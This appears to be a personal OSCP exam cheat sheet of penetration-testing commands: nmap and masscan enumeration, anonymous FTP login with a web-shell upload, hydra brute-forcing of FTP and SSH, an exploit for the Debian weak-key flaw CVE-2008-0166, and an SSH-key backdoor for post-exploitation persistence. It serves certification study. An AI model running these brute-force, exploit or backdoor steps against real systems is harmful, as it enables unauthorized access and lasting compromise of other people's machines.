---
layout: default
title : My OSCP cheat sheet
---

***
## Enumeration
***

```
nmap -sC -sV -o nmap -A -T5 <IP>
nmap -sC -vv -o nmap -T4 <IP>

Host Discovery
   •  nmap -sn 10.10.1.1-254 -vv -oA hosts
   •  netdiscover -r 10.10.10.0/24

DNS server discovery
   •  nmap -p 53 10.10.10.1-254 -vv -oA dcs
   
NSE Scripts Scan 
   * nmap -sV --script=vulscan/vulscan.nse (https://securitytrails.com/blog/nmap-vulnerability-scan)
   
Port specific NSE script list :

   ls /usr/share/nmap/scripts/ssh*
   ls /usr/share/nmap/scripts/smb*
   
```

***
## Scanning all ports
***

```
masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports 10.10.10.x

Running specific NSE scripts :
    nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T4 -A
````
sC - default scripts, sV - scan for versions, oA- output all  formats
Optional - sT (performs full scan instead of syn-scan to prevent getting flagged by firewalls)
From Apache Version to finding Ubuntu version -> ubuntu httpd versions

***
## FTP: (port21)
***
```
anonymous login check 
   -  ftp <ip address>
   -  username : anonymous
   -  pwd : anonymous
   -  file upload -> put shell.php
   -  file download -> get file
  
Bruteforce ftp
   
  hydra -V -f -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt  ftp://<IP> -u -vV
``` 

***
## SSH: (port22)
***
```
id_rsa.pub : Public key that can be used in authorized_keys for login
id_rsa : Private key that is used for login. Might ask for password. can be cracked with ssh2john and john
   -  id_rsa
   -  ssh -i id_rsa user@10.10.10.x
   -  For passwordless login, add id_rsa.pub to target's authorized_keys
   -  ssh2john

Bruteforce ssh

   hydra -V -f -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt ssh://<IP> -u -vV
```

***
### CVE-2008-0166
***
```
All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
```

***
### SSH backdoor - post exploitation
***
```
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
```
